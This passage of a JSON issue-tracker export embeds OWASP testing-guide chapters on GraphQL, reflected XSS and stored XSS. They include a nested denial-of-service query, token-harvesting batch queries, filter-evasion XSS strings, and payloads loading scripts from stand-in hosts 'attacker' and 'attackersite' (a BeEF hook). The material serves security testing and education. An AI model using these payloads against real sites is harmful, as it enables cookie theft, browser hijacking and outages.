2,\n          \u0022column\u0022: 10,\n          \u0022sourceName\u0022: null\n        }\n      ],\n      \u0022description\u0022: \u0022argument \u0027veterinaryId\u0027 with value \u0027StringValue{value=\u0027\u003Cscript\u003Ealert(\u00271\u0027)\u003C/script\u003E\u0027}\u0027 is not a valid \u0027Int\u0027\u0022,\n      \u0022validationErrorType\u0022: \u0022WrongType\u0022,\n      \u0022queryPath\u0022: [\n        \u0022myInfo\u0022\n      ],\n      \u0022errorType\u0022: \u0022ValidationError\u0022,\n      \u0022extensions\u0022: null,\n      \u0022path\u0022: null\n    }\n  ]\n}\n\u0060\u0060\u0060\n\n### Denial of Service (DoS) Queries\n\nGraphQL exposes a very simple interface to allow developers to use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function and causing a denial of service by using up CPU, memory, or other compute resources.\nLooking back at *Figure 12.1-1*, you can see that it is possible to create a loop where a Dog object contains a Veterinary object. There could be an endless amount of nested objects.\nThis allows for a deep query which has the potential to overload the application:\n\n\u0060\u0060\u0060\nquery dos {\n  allDogs(onlyFree: false, limit: 1000000) {\n    id\n    name\n    veterinary {\n      id\n      name\n      dogs {\n        id\n        name\n        veterinary {\n          id\n          name\n          dogs {\n            id\n            name\n            veterinary {\n              id\n              name\n              dogs {\n                id\n                name\n                veterinary {\n                  id\n                  name\n                  dogs {\n                    id\n                    name\n                    veterinary {\n                      id\n                      name\n                      dogs {\n                        id\n                        name\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u0060\u0060\u0060\n\nThere are multiple security measures that can be implemented to prevent these types of queries, listed in the [Remediation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL#remediation) section. Abusive queries can cause issues like DoS for GraphQL deployments and should be included in testing.\n\n### Batching Attacks\n\nGraphQL supports batching of multiple queries into a single request. This allows users to request multiple objects or multiple instances of objects efficiently. However, an attacker can utilize this functionality in order to perform a batching attack. Sending more than a single query in one request looks like the following:\n\n\u0060\u0060\u0060\n[\n  {\n    query: \u003C query 0 \u003E,\n    variables: \u003C variables for query 0 \u003E,\n  },\n  {\n    query: \u003C query 1 \u003E,\n    variables: \u003C variables for query 1 \u003E,\n  },\n  {\n    query: \u003C query n \u003E\n    variables: \u003C variables for query n \u003E,\n  }\n]\n\u0060\u0060\u0060\n\nIn the example application, a single request can be sent in order to extract all of the veterinary names using the guessable ID (it\u2019s an increasing integer). An attacker can then utilize the names in order to get access tokens. Instead of doing so in many requests, which might be blocked by a network security measure like a web application firewall or a rate limiter like Nginx, these requests may be batched. This means there would only be a couple of requests, which may allow for efficient brute forcing without being detected. Here is an example query:\n\n\u0060\u0060\u0060\nquery {\n  Veterinary(id: \u00221\u0022) {\n    name\n  }\n  second:Veterinary(id: \u00222\u0022) {\n    name\n  }\n  third:Veterinary(id: \u00223\u0022) {\n    name\n  }\n}\n\u0060\u0060\u0060\n\nThis will provide the attacker with the names of the veterinaries and, as shown before, the names can be used to batch multiple queries requesting the auth tokens of those veterinaries. For example:\n\n\u0060\u0060\u0060\nquery {\n  auth(veterinaryName: \u0022Julien\u0022)\n  second: auth(veterinaryName:\u0022Benoit\u0022)\n}\n\u0060\u0060\u0060\n\nBatching attacks can be used to bypass many security measures enforced on sites. It can also be used to enumerate objects and attempt to brute force multi-factor authentication or other sensitive information.\n\n### Detailed Error Message\n\nGraphQL can encounter unexpected errors during runtime. When such an error occurs, the server may send an error response that may reveal internal error details or application configurations or data. This allows a malicious user to acquire more information about the application. As part of testing, error messages should be checked by sending unexpected data, a process known as fuzzing. The responses should be searched for potentially sensitive information that may be revealed using this technique.\n\n### Exposure of Underlying API\n\nGraphQL is a relatively new technology, and some applications are transitioning from old APIs to GraphQL. In many cases, GraphQL is deployed as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If requests to the underlying API are not properly checked for authorization, it could lead to a possible escalation of privileges.\nFor example, a request containing the parameter \u0060id=1/delete\u0060 might be interpreted as \u0060/api/users/1/delete\u0060. This could extend to the manipulation of other resources belonging to \u0060user=1\u0060. It is also possible that the request is interpreted to have the authorization given to the GraphQL node, instead of the true requester.\nA tester should try and gain access to underlying API methods as it may be possible to escalate privileges.\n\n## Remediation\n\n* Restrict access to introspection queries.\n* Implement input validation.\n    * GraphQL does not have a native way to validate input, however, there is an open source project called [\u201Cgraphql-constraint-directive\u201D](https://github.com/confuser/graphql-constraint-directive) which allows for input validation as part of the schema definition.\n    * Input validation alone is helpful, but it is not a complete solution and additional measures should be taken to mitigate injection attacks.\n* Implement security measures to prevent abusive queries.\n    * Timeouts: restrict the amount of time that a query is permitted to run.\n    * Maximum query depth: limit the depth of allowed queries, which may prevent queries that are too deep from abusing resources.\n    * Set maximum query complexity: limit the complexity of queries to mitigate the abuse of GraphQL resources.\n    * Use server-time-based throttling: limit the amount of server time a user can consume.\n    * Use query-complexity-based throttling: limit the total complexity of queries a user can consume.\n* Send generic error messages: use generic error messages that do not reveal details of the deployment.\n* Mitigate batching attacks:\n    * Add object request rate limiting in code.\n    * Prevent batching for sensitive objects.\n    * Limit the number of queries that can run at one time.\n\nFor more on remediating GraphQL weaknesses, refer to the [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).\n\n## Tools\n\n* [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)\n* [GraphQL Voyager](https://apis.guru/graphql-voyager/)\n* [sqlmap](https://github.com/sqlmapproject/sqlmap)\n* [InQL (Burp Extension)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)\n* [GraphQL Raider (Burp Extension)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)\n* [GraphQL (Add-on for ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [poc-graphql](https://github.com/righettod/poc-graphql)\n* [GraphQL Official Site](https://graphql.org/learn/)\n* [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)\n* [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)\n* [Client-side Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/README) (XSS and other vulnerabilities)\n* [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)\n* [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)\n* [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"12-API Testing","Description":"12-API Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"97a8eae3-9d82-4cbf-ac05-2a640c07d95b","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-01Testing for Reflected Cross Site Scripting","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nReflected [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.\nReflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.\nWhen a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim\u2019s browser.\nCommonly the attacker\u2019s code is written in the JavaScript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).\nOne of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out \u0060\u003Cscript\u003E\u0060, but might not filter \u0060%3cscript%3e\u0060 which simply includes another encoding of tags.","TestingInstructions":"## Test Objectives\n\n* Identify variables that are reflected in responses.\n* Assess the input they accept and the encoding that gets applied on return (if any).\n\n## How to Test\n\n### Black-Box Testing\n\nA black-box test will include at least three phases:\n\n#### Detect Input Vectors\n\nDetect input vectors. For each web page, the tester must determine all the web application\u2019s user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.\n\n#### Analyze Input Vectors\n\nAnalyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually. Some example of such input data are the following:\n\n* \u0060\u003Cscript\u003Ealert(123)\u003C/script\u003E\u0060\n* \u0060\u0022\u003E\u003Cscript\u003Ealert(document.cookie)\u003C/script\u003E\u0060\n\nFor a comprehensive list of potential test strings see the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).\n\n#### Check Impact\n\nFor each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application\u2019s security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.\nIdeally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:\n\n* \u0060\u003E\u0060 (greater than)\n* \u0060\u003C\u0060 (less than)\n* \u0060\u0026\u0060 (ampersand)\n* \u0060\u0027\u0060 (apostrophe or single quote)\n* \u0060\u0022\u0060 (double quote)\n\nHowever, a full list of entities is defined by the HTML and XML specifications. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).\nWithin the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:\n\n* \u0060\\n\u0060 (new line)\n* \u0060\\r\u0060 (carriage return)\n* \u0060\u0027\u0060 (apostrophe or single quote)\n* \u0060\u0022\u0060 (double quote)\n* \u0060\\\u0060 (backslash)\n* \u0060\\uXXXX\u0060 (unicode values)\n\nFor a more complete reference, see the [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).\n\n#### Example 1\n\nFor example, consider a site that has a welcome notice \u0060Welcome %username%\u0060 and a download link.\n![XSS Example 1](Image Not Found)\n*Figure 4.7.1-1: XSS Example 1*\nThe tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability.\nLet\u2019s try to click on the following link and see what happens:\n\n\u0060\u0060\u0060\nhttp://example.com/index.php?user=\u003Cscript\u003Ealert(123)\u003C/script\u003E\n\u0060\u0060\u0060\n\nIf no sanitization is applied this will result in the following popup:\n![Alert](Image Not Found)\n*Figure 4.7.1-2: XSS Example 1*\nThis indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody\u2019s browser if he clicks on the tester\u2019s link.\n\n#### Example 2\n\nLet\u2019s try other piece of code (link):\n\n\u0060\u0060\u0060\nhttp://example.com/index.php?user=\u003Cscript\u003Ewindow.onload = function() {var AllLinks=document.getElementsByTagName(\u0022a\u0022);AllLinks[0].href = \u0022http://badexample.com/malicious.exe\u0022;}\u003C/script\u003E\n\u0060\u0060\u0060\n\nThis produces the following behavior:\n![XSS Example 2](Image Not Found)\n*Figure 4.7.1-3: XSS Example 2*\nThis will cause the user, clicking on the link supplied by the tester, to download the file \u0060malicious.exe\u0060 from a site they control.\n\n### Bypass XSS Filters\n\nReflected cross-site scripting attacks are prevented as the web application sanitizes input, a web application firewall blocks malicious input, or by mechanisms embedded in modern web browsers. The tester must test for vulnerabilities assuming that web browsers will not prevent the attack. Browsers may be out of date, or have built-in security features disabled. Similarly, web application firewalls are not guaranteed to recognize novel, unknown attacks. An attacker could craft an attack string that is unrecognized by the web application firewall.\nThus, the majority of XSS prevention must depend on the web application\u2019s sanitization of untrusted user input. There are several mechanisms available to developers for sanitization, such as returning an error, removing, encoding, or replacing invalid input. The means by which the application detects and corrects invalid input is another primary weakness in preventing XSS. A deny list may not include all possible attack strings, an allow list may be overly permissive, the sanitization could fail, or a type of input may be incorrectly trusted and remain unsanitized. All of these allow attackers to circumvent XSS filters.\nThe [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.\n\n#### Example 3: Tag Attribute Value\n\nSince these filters are based on a deny list, they could not block every type of expressions. In fact, there are cases in which an XSS exploit can be carried out without the use of \u0060\u003Cscript\u003E\u0060 tags and even without the use of characters such as \u0060\u003C\u0060 and \u0060\u003E\u0060 that are commonly filtered.\nFor example, the web application could use the user input value to fill an attribute, as shown in the following code:\n\n\u0060\u0060\u0060\n\u003Cinput type=\u0022text\u0022 name=\u0022state\u0022 value=\u0022INPUT_FROM_USER\u0022\u003E\n\u0060\u0060\u0060\n\nThen an attacker could submit the following code:\n\n\u0060\u0060\u0060\n\u0022 onfocus=\u0022alert(document.cookie)\n\u0060\u0060\u0060\n\n#### Example 4: Different Syntax or Encoding\n\nIn some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.\nFollowing some examples:\n\n* \u0060\u0022\u003E\u003Cscript \u003Ealert(document.cookie)\u003C/script \u003E\u0060\n* \u0060\u0022\u003E\u003CScRiPt\u003Ealert(document.cookie)\u003C/ScRiPt\u003E\u0060\n* \u0060\u0022%3cscript%3ealert(document.cookie)%3c/script%3e\u0060\n\n#### Example 5: Bypassing Non-Recursive Filtering\n\nSometimes the sanitization is applied only once and it is not being performed recursively. In this case the attacker can beat the filter by sending a string containing multiple attempts, like this one:\n\n\u0060\u0060\u0060\n\u003Cscr\u003Cscript\u003Eipt\u003Ealert(document.cookie)\u003C/script\u003E\n\u0060\u0060\u0060\n\n#### Example 6: Including External Script\n\nNow suppose that developers of the target site implemented the following code to protect the input from the inclusion of external script:\n\n\u0060\u0060\u0060\n\u003C?\n    $re = \u0022/\u003Cscript[^\u003E]\u002Bsrc/i\u0022;\n\n    if (preg_match($re, $_GET[\u0027var\u0027]))\n    {\n        echo \u0022Filtered\u0022;\n        return;\n    }\n    echo \u0022Welcome \u0022.$_GET[\u0027var\u0027].\u0022 !\u0022;\n?\u003E\n\u0060\u0060\u0060\n\nDecoupling the above regular expression:\n\n1. Check for a \u0060\u003Cscript\u0060\n2. Check for a \u201C \u201C (whitespace)\n3. Any character but the character \u0060\u003E\u0060 for one or more occurrences\n4. Check for a \u0060src\u0060\n\nThis is useful for filtering expressions like \u0060\u003Cscript src=\u0022http://attacker/xss.js\u0022\u003E\u003C/script\u003E\u0060 which is a common attack. But, in this case, it is possible to bypass the sanitization by using the \u0060\u003E\u0060 character in an attribute between script and src, like this:\n\n\u0060\u0060\u0060\nhttp://example/?var=\u003CSCRIPT%20a=\u0022\u003E\u0022%20SRC=\u0022http://attacker/xss.js\u0022\u003E\u003C/SCRIPT\u003E\n\u0060\u0060\u0060\n\nThis will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker\u2019s web server as if it was originating from the victim site, \u0060http://example/\u0060.\n\n#### Example 7: HTTP Parameter Pollution (HPP)\n\nAnother method to bypass filters is the HTTP Parameter Pollution, this technique was first presented by Stefano di Paola and Luca Carettoni in 2009 at the OWASP Poland conference. See the [Testing for HTTP Parameter pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) for more information. This evasion technique consists of splitting an attack vector between multiple parameters that have the same name. The manipulation of the value of each parameter depends on how each web technology is parsing these parameters, so this type of evasion is not always possible. If the tested environment concatenates the values of all parameters with the same name, then an attacker could use this technique in order to bypass pattern- based security mechanisms. Regular attack:\n\n\u0060\u0060\u0060\nhttp://example/page.php?param=\u003Cscript\u003E[...]\u003C/script\u003E\n\u0060\u0060\u0060\n\nAttack using HPP:\n\n\u0060\u0060\u0060\nhttp://example/page.php?param=\u003Cscript\u0026param=\u003E[...]\u003C/\u0026param=script\u003E\n\u0060\u0060\u0060\n\nSee the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors\u2019 browsers.\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester.\nIf source code is available (white-box testing), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented.\n\n## Tools\n\n* [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.\n* [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).\n* [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.\n* [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.\n* [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.","Details":null,"Implication":null,"Recommendation":null,"References":"### OWASP Resources\n\n* [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\n\n### Books\n\n* Joel Scambray, Mike Shema, Caleb Sima - \u201CHacking Exposed Web Applications\u201D, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0\n* Dafydd Stuttard, Marcus Pinto - \u201CThe Web Application\u2019s Handbook - Discovering and Exploiting Security Flaws\u201D, 2008, Wiley, ISBN 978-0-470-17077-9\n* Jeremiah Grossman, Robert \u201CRSnake\u201D Hansen, Petko \u201Cpdp\u201D D. Petkov, Anton Rager, Seth Fogie - \u201CCross Site Scripting Attacks: XSS Exploits and Defense\u201D, 2007, Syngress, ISBN-10: 1-59749-154-3\n\n### Whitepapers\n\n* [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)\n* [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)\n* [G.Ollmann - HTML Code Injection and Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)\n* [S. Frei, T. D\u00FCbendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-02 Testing for Stored Cross Site Scripting","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nStored [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.\nStored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the site and run within the user\u2019s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.\nThis vulnerability can be used to conduct a number of browser-based attacks including:\n\n* Hijacking another user\u2019s browser\n* Capturing sensitive information viewed by application users\n* Pseudo defacement of the application\n* Port scanning of internal hosts (\u201Cinternal\u201D in relation to the users of the web application)\n* Directed delivery of browser-based exploits\n* Other malicious activities\n\nStored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:\n\n* Attacker stores malicious code into the vulnerable page\n* User authenticates in the application\n* User visits vulnerable page\n* Malicious code is executed by the user\u2019s browser\n\nThis type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com/) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.\nStored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.","TestingInstructions":"## Test Objectives\n\n* Identify stored input that is reflected on the client-side.\n* Assess the input they accept and the encoding that gets applied on return (if any).\n\n## How to Test\n\n### Black-Box Testing\n\nThe process for identifying stored XSS vulnerabilities is similar to the process described during the [testing for reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).\n\n#### Input Forms\n\nThe first step is to identify all points where user input is stored into the backend and then displayed by the application. Typical examples of stored user input can be found in:\n\n* User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.\n* Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later\n* File Manager: application that allows upload of files\n* Application settings/preferences: application that allows the user to set preferences\n* Forum/Message board: application that permits exchange of posts among users\n* Blog: if the blog application permits to users submitting comments\n* Log: if the application stores some users input into logs.\n\n#### Analyze HTML Code\n\nInput stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input.\n**Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.\n**Example**: Email stored data in \u0060index2.php\u0060\n![Stored Input Example](Image Not Found)\n*Figure 4.7.2-1: Stored Input Example*\nThe HTML code of index2.php where the email value is located:\n\n\u0060\u0060\u0060\n\u003Cinput class=\u0022inputbox\u0022 type=\u0022text\u0022 name=\u0022email\u0022 size=\u002240\u0022 value=\u0022aaa@aa.com\u0022 /\u003E\n\u0060\u0060\u0060\n\nIn this case, the tester needs to find a way to inject code outside the \u0060\u003Cinput\u003E\u0060 tag as below:\n\n\u0060\u0060\u0060\n\u003Cinput class=\u0022inputbox\u0022 type=\u0022text\u0022 name=\u0022email\u0022 size=\u002240\u0022 value=\u0022aaa@aa.com\u0022\u003E MALICIOUS CODE \u003C!-- /\u003E\n\u0060\u0060\u0060\n\n#### Testing for Stored XSS\n\nThis involves testing the input validation and filtering controls of the application. Basic injection examples in this case:\n\n* \u0060aaa@aa.com\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;\u0060\n* \u0060aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E\u0060\n\nEnsure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.\n\n\u003E ![Stored XSS Example](Image Not Found)\n\u003E *Figure 4.7.2-2: Stored Input Example*\n\u003E The HTML code following the injection:\n\u003E\n\u003E \u0060\u0060\u0060\n\u003E \u003Cinput class=\u0022inputbox\u0022 type=\u0022text\u0022 name=\u0022email\u0022 size=\u002240\u0022 value=\u0022aaa@aa.com\u0022\u003E\u003Cscript\u003Ealert(document.cookie)\u003C/script\u003E\n\u003E \n\u003E \u0060\u0060\u0060\n\u003E\n\u003E The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string \u201CSCRIPT\u201D is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.\n\n#### Leverage Stored XSS with BeEF\n\nStored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com/) and [XSS Proxy](http://xss-proxy.sourceforge.net/).\nA typical BeEF exploitation scenario involves:\n\n* Injecting a JavaScript hook which communicates to the attacker\u2019s browser exploitation framework (BeEF)\n* Waiting for the application user to view the vulnerable page where the stored input is displayed\n* Control the application user\u2019s browser via the BeEF console\n\nThe JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.\n**Example**: BeEF Injection in \u0060index2.php\u0060:\n\n\u0060\u0060\u0060\naaa@aa.com\u0022\u003E\u003Cscript src=http://attackersite/hook.js\u003E\u003C/script\u003E\n\u0060\u0060\u0060\n\nWhen the user loads the page \u0060index2.php\u0060, the script \u0060hook.js\u0060 is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.\n\n\u003E ![Beef Injection Example](Image Not Found)\n\u003E *Figure 4.7.2-3: Beef Injection Example*\n\u003E This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.\n\n#### File Upload\n\nIf the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. The pen-tester should also verify if the file upload allows setting arbitrary MIME types.\nConsider the following HTTP POST request for file upload:\n\n\u0060\u0060\u0060\nPOST /fileupload.aspx HTTP/1.1\n[\u2026]\nContent-Disposition: form-data; name=\u0022uploadfile1\u0022; filename=\u0022C:\\Documents and Settings\\test\\Desktop\\test.txt\u0022\nContent-Type: text/plain\n\ntest\n\u0060\u0060\u0060\n\nThis design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as \u0060image/gif\u0060 can instead be set to \u0060text/html\u0060. In this case the file will be treated by the client browser as HTML.\nHTTP POST Request forged:\n\n\u0060\u0060\u0060\nContent-Disposition: form-data; name=\u0022uploadfile1\u0022; filename=\u0022C:\\Documents and Settings\\test\\Desktop\\test.gif\u0022\nContent-Type: text/html\n\n\u003Cscript\u003Ealert(document.cookie)\u003C/script\u003E\n\u0060\u0060\u0060\n\nAlso consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. For instance, Internet Explorer handles TXT files with HTML content as HTML content. For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter.\n\n### Blind Cross-site 